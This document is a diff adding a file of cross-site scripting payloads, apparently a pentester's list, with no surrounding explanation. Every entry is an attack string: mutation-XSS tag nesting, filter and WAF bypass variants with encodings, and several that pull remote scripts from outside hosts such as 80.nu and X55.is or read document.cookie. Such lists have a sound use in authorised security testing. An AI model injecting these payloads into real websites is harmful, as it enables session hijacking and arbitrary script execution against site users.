@@ -1,0 +1,32 @@
+x\"><img src='//a2h4in1iqgqq162j3zngrmy87.canarytokens.com'>\">&quot;&lt;img src='//80.nu'&gt;<script src=//80.nu><a title=\"</style><script src=‘//80.nu'>\">&quot;&lt;img src='//80.nu'&gt;
+
+<image href="</title><iframe srcdoc=111>">
+
+<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='' onerror='alert(1)'>">
+
+>\"><math><mtext><option><OTTOOTTO><option></option><mglyph><svg><mtext><style><a title=\"</style><img src='//80.nu'>\">&quot;&lt;img src=‘//80.nu'&gt;
+
+zzzzzz\"><iframe><script src=//80.nu><a title=\"</style><img src=‘//80.nu'>\">&quot;&lt;img src='//80.nu'&gt;
+
+>\"><math><mtext><option><OTTOOTTO><option></option><mglyph><svg><mtext><style><a title=\"</style><img src='//80.nu'>\">&quot;&lt;img src=‘//80.nu'&gt;
+
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+
+<input type="text" value=`` <div/autofocus/onfo<!--esi-->cus='a<!--esi-->lert("XSS")’>X</div>
+
+<input type="text" value=`` <div/autofocus/onfo<!--esi-->cus='a<!--esi-->lert("XSS")’>X</div>
+
+Payload: 10</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload =prompt(document.cookie)%20>
+
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+
+xss payload: "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+
+xss payload: &lt;img longdesc="src='x'onerror =alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+
+<iframe%2Fsrc%3D"javascript%3Aalert(1)%25%0D3C!--
+
+"><details/open/id="&XSS"ontoggle =alert("XSS_WAF_BYPASS_:-)")>
+"><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
+
+<<https:X55.is/onfocus=1?import(tagName):1+AutoFocus+ContentEditable>>
